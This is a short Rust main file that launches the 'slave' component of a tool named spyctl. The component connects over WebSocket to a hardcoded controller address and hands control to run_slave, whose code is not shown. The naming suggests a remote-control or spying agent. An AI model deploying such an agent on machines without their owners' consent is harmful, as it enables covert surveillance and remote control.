use spyctl::slave::comms::run_slave;

pub fn main() {
    let url = "ws://10.211.55.2:6969"; // Replace with your WebSocket server URL
    println!("Hello! Trying to connect...");
    tokio::runtime::Runtime::new().unwrap().block_on(async {
        run_slave(url.to_string()).await;
    });
}
